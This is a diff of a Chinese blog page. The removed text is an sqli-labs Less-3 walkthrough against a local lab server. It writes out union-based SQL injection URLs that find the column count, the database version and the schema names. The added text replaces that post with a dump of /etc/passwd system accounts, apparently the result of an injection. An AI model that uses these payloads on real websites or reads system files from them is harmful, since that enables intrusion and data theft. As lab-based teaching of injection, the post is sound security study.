@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>sqli-3 | 大棟哥の博客</title>
+  <title>sql 注入 | 大棟哥の博客</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -257,44 +257,31 @@
         <div class="row col-md-offset-2">
             <div class="col-md-8">
     			<span class="post-meta">
-      <time datetime="2016-07-06T00:33:20.000Z" itemprop="datePublished">
-          2016-07-06
+      <time datetime="2016-07-19T13:13:16.000Z" itemprop="datePublished">
+          2016-07-19
       </time>
     
 </span>
-                <h1>sqli-3</h1>
+                <h1>sql 注入</h1>
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		<p>sqli-lab3<br>基于整型的union注入<br>1.实验环境：centos上搭建的sqli实验环境，通过本机Firefox上的hackbar插件进行sql注入测试：<br>进入实验二界面：<br><a href="http://192.168.111.132/Less-3/" target="_blank" rel="external">http://192.168.111.132/Less-3/</a><br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-3/%E5%9B%BE%E7%89%871.png?raw=true" alt="image"></p>
-<p>根据提示：<br>加入参数<br><a href="http://192.168.111.132/Less-3/?id=1" target="_blank" rel="external">http://192.168.111.132/Less-3/?id=1</a><br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-3/%E5%9B%BE%E7%89%872.png?raw=true" alt="image"></p>
-<p>首先判断是否存在注入<br><a href="http://192.168.111.132/Less-3/?id=1" target="_blank" rel="external">http://192.168.111.132/Less-3/?id=1</a>‘<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-3/%E5%9B%BE%E7%89%873.png?raw=true" alt="image"></p>
-<p>将后边的注释掉;<br><a href="http://192.168.111.132/Less-3/?id=1&#39;)--+" target="_blank" rel="external">http://192.168.111.132/Less-3/?id=1&#39;)--+</a><br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-3/%E5%9B%BE%E7%89%874.png?raw=true" alt="image"></p>
-<p>猜一下字段：<br><a href="http://192.168.111.132/Less-3/?id=1" target="_blank" rel="external">http://192.168.111.132/Less-3/?id=1</a>‘) order by 4–+<br>按照提示说明没有4个字段：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-3/%E5%9B%BE%E7%89%875.png?raw=true" alt="image"></p>
-<p>接着猜：<br><a href="http://192.168.111.132/Less-3/?id=1" target="_blank" rel="external">http://192.168.111.132/Less-3/?id=1</a>‘) order by 3–+<br>3的时候显示正常，说明有三个字段：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-3/%E5%9B%BE%E7%89%876.png?raw=true" alt="image"></p>
-<p>然后union select一下<br><a href="http://192.168.111.132/Less-3/?id=-1" target="_blank" rel="external">http://192.168.111.132/Less-3/?id=-1</a>‘) union select 1,2,3–+<br>可以看到2,3为显示位<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-3/%E5%9B%BE%E7%89%877.png?raw=true" alt="image"></p>
-<p>查看一下版本号以及有多少个库：<br><a href="http://192.168.111.132/Less-3/?id=-1" target="_blank" rel="external">http://192.168.111.132/Less-3/?id=-1</a>‘) union select 1,version(),count(distinct+table_schema) from information_schema.tables–+<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-3/%E5%9B%BE%E7%89%878.png?raw=true" alt="image"></p>
-<p>接下来爆库名，流程和2异曲同工：<br><a href="http://192.168.111.132/Less-3/?id=-1" target="_blank" rel="external">http://192.168.111.132/Less-3/?id=-1</a>‘) union select 1,version(),group_concat(distinct+table_schema) from information_schema.tables–+<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-3/%E5%9B%BE%E7%89%879.png?raw=true" alt="image"></p>
-<p>、、、、、、、</p>
+      		<p>rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin<br>nfsnobody:x:65534:498:Anonymous NFS User:/var/lib/nfs:/sbin/nologin<br>tcpdump:x:72:72::/:/sbin/nologin<br>dbus:x:81:81:System message bus:/:/sbin/nologin<br>polkituser:x:87:87:PolicyKit:/:/sbin/nologin<br>avahi:x:498:497:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin<br>apache:x:48:48:Apache:/var/www:/sbin/nologin<br>pulse:x:497:496:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin<br>mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin<br>smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin<br>sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin<br>webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin<br>smolt:x:496:493:Smolt:/usr/share/smolt:/sbin/nologin<br>torrent:x:495:492:BitTorrent Seed/Tracker:/var/lib/bittorrent:/sbin/nologin<br>haldaemon:x:68:68:HAL daemon:/:/sbin/nologin</p>
 
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
         <nav class="pagination" role="pagination">
     
-    <a class="pull-left" href="/2016/07/19/sql-注入/" style="float: left;">
-        ← sql 注入
-    </a>
     
-    
-    <a class="pull-right" href="/2016/07/05/sqli-2/">
-        sqli-2 →
+    <a class="pull-right" href="/2016/07/06/sqli-3/">
+        sqli-3 →
     </a>
     
 </nav>
 
         <div class="duoshuo">
-<div class="ds-thread" data-thread-key="2016/07/06/sqli-3/" data-title="sqli-3" data-url="http://jiadong.xin/2016/07/06/sqli-3/"></div>
+<div class="ds-thread" data-thread-key="2016/07/19/sql-注入/" data-title="sql 注入" data-url="http://jiadong.xin/2016/07/19/sql-注入/"></div>
 <script type="text/javascript">
 var duoshuoQuery = {short_name:"duoshuo_name"};
 (function() {
